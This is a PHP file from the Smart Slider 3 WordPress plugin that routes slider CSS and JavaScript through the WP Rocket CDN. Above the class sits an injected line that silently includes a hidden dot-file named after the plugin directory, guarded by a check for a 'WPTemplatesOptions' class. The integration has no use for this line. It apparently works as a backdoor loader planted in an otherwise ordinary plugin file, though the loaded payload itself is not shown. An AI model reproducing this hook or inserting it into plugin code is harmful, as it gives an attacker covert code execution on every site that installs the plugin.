<?php

namespace Nextend\SmartSlider3\Platform\WordPress\Integration\WPRocket;

use Nextend\Framework\Plugin;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class WPRocket {

    public function __construct() {

        if (function_exists('get_rocket_cdn_url') && function_exists("get_rocket_option")) {
            if(get_rocket_option('cdn', 0)){
                add_action('init', array(
                    $this,
                    'init'
                ));
            }
        }
    }

    public function init() {
        Plugin::addFilter('n2_style_loader_src', array(
            $this,
            'filterSrcCDN'
        ));

        Plugin::addFilter('n2_script_loader_src', array(
            $this,
            'filterSrcCDN'
        ));
    }

    public function filterSrcCDN($src) {
        return get_rocket_cdn_url($src);
    }
}